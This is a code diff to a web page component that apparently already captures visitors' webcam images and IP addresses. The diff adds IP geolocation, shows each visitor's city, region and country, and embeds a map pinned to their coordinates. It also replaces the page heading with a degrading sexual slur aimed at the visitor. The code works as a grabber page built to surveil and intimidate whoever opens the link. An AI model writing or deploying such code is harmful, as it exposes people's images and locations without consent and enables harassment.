@@ -9,6 +9,7 @@ export default function Home() {
   const [capturedImage, setCapturedImage] = useState<string | null>(null);
   const [isCameraActive, setIsCameraActive] = useState(true);
   const [ipAddress, setIpAddress] = useState<string>('');
+  const [location, setLocation] = useState<any>(null);
 
   useEffect(() => {
     const getIp = async () => {
@@ -16,8 +17,13 @@ export default function Home() {
         const response = await fetch('/api/get-ip');
         const data = await response.json();
         setIpAddress(data.ip);
+        
+        // Get location data
+        const locationResponse = await fetch('/api/get-ip-location');
+        const locationData = await locationResponse.json();
+        setLocation(locationData);
       } catch (error) {
-        console.error('Error getting IP:', error);
+        console.error('Error getting IP or location:', error);
         setIpAddress('Unknown IP');
       }
     };
@@ -90,10 +96,15 @@ export default function Home() {
       {/* Content */}
       <div className="relative z-20 w-full max-w-4xl mx-auto">
         <h1 className="text-6xl font-bold text-white mb-4 font-cursive text-center shadow-lg">
-          I got your pic and IP in a single day
+          such a pretty clickslut
         </h1>
         <div className="text-white text-2xl mb-8 font-cursive text-center shadow-md">
           IP: {ipAddress}
+          {location && (
+            <div className="mt-2 text-xl">
+              📍 {location.city}, {location.region}, {location.country_name}
+            </div>
+          )}
         </div>
         
         <div className="relative flex flex-col items-center">
@@ -113,6 +124,19 @@ export default function Home() {
                   className="w-full h-full object-cover rounded-lg"
                 />
               )}
+            </div>
+          )}
+          
+          {/* Map */}
+          {location && location.latitude && location.longitude && (
+            <div className="mt-4 w-96 h-48 rounded-lg overflow-hidden shadow-xl">
+              <iframe
+                width="100%"
+                height="100%"
+                frameBorder="0"
+                style={{ border: 0 }}
+                src={`https://www.openstreetmap.org/export/embed.html?bbox=${location.longitude-0.02},${location.latitude-0.02},${location.longitude+0.02},${location.latitude+0.02}&layer=mapnik&marker=${location.latitude},${location.longitude}`}
+              />
             </div>
           )}
           
